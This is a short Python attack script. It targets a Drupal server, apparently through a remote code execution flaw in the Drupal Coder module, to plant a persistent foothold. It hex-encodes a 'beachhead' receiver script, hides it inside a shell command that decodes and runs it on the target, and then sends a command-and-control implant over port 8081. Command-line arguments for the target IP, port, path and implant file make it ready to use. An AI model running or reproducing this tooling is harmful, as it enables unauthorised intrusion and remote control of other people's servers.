from include.BeachheadSender import BeachheadSender
from include.DrupalCoderExec import DrupalCoderExec

import binascii
from base64 import b64encode
import pathlib
import time

PARENT_DIR = str(pathlib.Path(__file__).parent.absolute()) + '/'
BEACHHEAD_LOCATION = PARENT_DIR + 'include/BeachheadReceiver.py'

def package_beachhead():
    with open(BEACHHEAD_LOCATION, 'r') as f:
        receiver = f.read()
    hex_beachhead = binascii.hexlify(receiver.encode('utf-8')).decode('utf-8')
    return "CMD=`xxd -r -p <<< " + hex_beachhead + "`;python3 $CMD"

def implant_beachhead(ip_addr, port, path):
    beachhead = package_beachhead()
    exec = DrupalCoderExec(beachhead)
    exec.exploit(ip_addr, port, path)
    
def implant_cnc(ip_addr, port, path, implant_file_path):
    sender = BeachheadSender(ip_addr, port, path, implant_file_path)
    sender.send_request()


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', required=True, help='IP address of the target machine')
    parser.add_argument('--port', required=True, help='Port of the Drupal server')
    parser.add_argument('--path', required=True, help='Path to the Drupal server')
    parser.add_argument('--implant', required=True, help='Path to the implant file')
    args = parser.parse_args()

    implant_beachhead(args.ip, args.port, args.path)
    time.sleep(5)
    
    implant_cnc(args.ip, "8081", args.path, args.implant)
    